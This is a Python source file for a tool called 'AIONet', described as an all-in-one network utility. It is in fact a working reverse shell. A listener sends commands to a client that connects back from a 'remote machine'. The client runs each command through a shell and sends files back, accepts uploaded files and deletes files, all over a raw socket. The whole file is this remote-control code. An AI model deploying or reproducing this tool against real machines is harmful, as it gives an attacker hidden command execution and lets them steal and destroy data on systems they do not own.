import argparse
import base64
import hashlib
import os
import socket
import subprocess
import sys
import threading


class Server:
	def __init__(self,port):
		self.host = "0.0.0.0"
		self.port = port
		
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((self.host,self.port))
		listener.listen(5)
		print(f"Listening on {self.host}:{self.port}")

		while True:
			self.connection, self.address = listener.accept()
			print()
			print(f"Received connection from {self.address}")
			ct = threading.Thread(target=self.handle, args=())
			ct.start()
	

	def handle(self):
		while True:
			command = input("AIONet > ")

			if command[0:6] == "upload":
				content,chash = self.upload_file(command)
				command = bytes(command, "utf-8") + b' ' + content + b' ' + chash +b'\n'
			else:
				command += "\n"

			if command == "exit\n":
				print(f"Closing connection to {self.address[0]}")
				self.connection.send(bytes(command, "utf-8"))
				print("Connection closed")
				sys.exit(0)

			response = self.rce(command)

			if type(command) is not bytes:
				if command[0:8] == "download":
					response = self.download_file(command, response)
				
			print(response)


	def download_file(self, command, response):
		path = str(command).split(" ")[1].rstrip()
		response = response.split(" ")
		received = response[0].strip()
		content = response[1].strip()
		try:
			with open(path,"wb") as dl_file:
				dec_content = base64.b64decode(content)
				local = hashlib.sha256(dec_content).hexdigest()
				if received == local:
					dl_file.write(dec_content)
					dl_file.close()
					return f"Downloaded {path}\nSHA256 hash verified:\nReceived: {received}\nLocal:    {local}\n"
				else:
					raise Exception("Hash verification failed.")
		except Exception as e:
			os.remove(path)
			return f"Download failed: {str(e)}\n"

	
	def upload_file(self, command):
		path = command.split(" ")[1]
		with open(path, "rb") as up_file:
			content = up_file.read()
			content_hash = hashlib.sha256(content).hexdigest()
			if type(content) is not bytes:
				content = bytes(content, "utf-8")
			if type(content_hash) is not bytes:
				content_hash = bytes(content_hash, "utf-8")
			return base64.b64encode(content), content_hash
	
	
	def rce(self, command):
		if type(command) is not bytes:
			command = bytes(command, "utf-8")
		self.connection.send(command)

		response = "\n"
		while response[-1] != "\x00":
			data = self.connection.recv(4096)
			response += data.decode("utf-8")
		response.strip()

		return response


class Client:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
		lt = threading.Thread(target=self.run, args=())
		lt.start()


	def exec_command(self, command):
		return subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)


	def move_fs(self, command):
		new_dir = command.split(" ")[1]
		try:
			os.chdir(new_dir)
			return f"Changed directory to {new_dir}\n"
		except Exception as e:
			return f"Error changing directory: {str(e)}\n"


	def remove_file(self, command):
		to_remove = command.split(" ")[1]
		try:
			os.remove(to_remove)
			return f"Removed {to_remove}\n"
		except Exception as e:
			return f"Error removing file: {str(e)}\n"

	
	def run(self):
		while True:
			command = ""
			while "\n" not in command:
				command += self.connection.recv(4096).decode("utf-8")
			command = command.rstrip()

			result = ""
			try:
				if command == "exit":
					self.connection.close()
					sys.exit(0)
				elif command[0:2] == "cd":
					if len(command) > 3:
						result = self.move_fs(command)
					else:
						raise Exception("Path missing")
				elif command[0:8] == "download":
					result = self.read_file(command)
				elif command[0:6] == "upload":
					result = self.write_file(command)
				elif command[0:2] == "rm":
					if len(command) > 3:
						result = self.remove_file(command)
					else:
						raise Exception("File name missing")
				else:
					result = self.exec_command(command)
			except Exception as e:
				result = f"Error: {str(e)}"

			if type(result) is not bytes:
				result += "\0"
			else:
				result += b"\0"

			if type(result) is not bytes:
				result = bytes(result, "utf-8")

			self.connection.send(result)


	def read_file(self, command):
		path = str(command).split(" ")[1].rstrip()
		with open(path, "rb") as in_file:
			content = in_file.read()
			content_hash = hashlib.sha256(content).hexdigest()
			if type(content) is not bytes:
				content = bytes(content, "utf-8")
			if type(content_hash) is not bytes:
				content_hash = bytes(content_hash, "utf-8")
			combined = content_hash + b" " + base64.b64encode(content)
			return combined


	def write_file(self, command):
		split_command = command.split(" ")
		path = split_command[1]
		content = split_command[2]
		chash = split_command[3]
		try:
			with open(path,"wb") as out_file:
				dec_content = base64.b64decode(content)
				whash = hashlib.sha256(dec_content).hexdigest()
				if chash == whash:
					out_file.write(dec_content)
					out_file.close()
					return f"Uploaded {path}\nSHA256 hash verified:\nReceived: {chash}\nLocal:    {whash}\n"
				else:
					raise Exception("Hash verification failed.")
		except Exception as e:
			os.remove(path)
			return f"Upload failed: {str(e)}\n"


def define_args():
	usage_str = """On host: python3 aionet.py -p PORT -l
	On remote machine: python3 aionet.py -t TARGET -p PORT"""
	parser = argparse.ArgumentParser(description="All-In-One Network Utility by Aditya Arole (@e1ora)",usage=usage_str)
	parser.add_argument("-t","--target",dest="target",type=str,metavar="target",help="IP address of the remote listener")
	parser.add_argument("-p","--port",dest="port",type=int,metavar="port",help="If used with -l, port where listener is to be created; else, port where remote listener exists")
	parser.add_argument("-l","--listen",dest="listen",action="store_true",help="Create a listener on the port defined using -p")
	parser.set_defaults(listen=False)

	if not len(sys.argv) > 1:
		parser.print_help()
		exit()
	
	return parser.parse_args(sys.argv[1:])


def main():
	args = define_args()

	if args.listen:
		Server(args.port)
	else:
		Client(args.target,args.port)


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("Exiting")
		sys.exit(0)
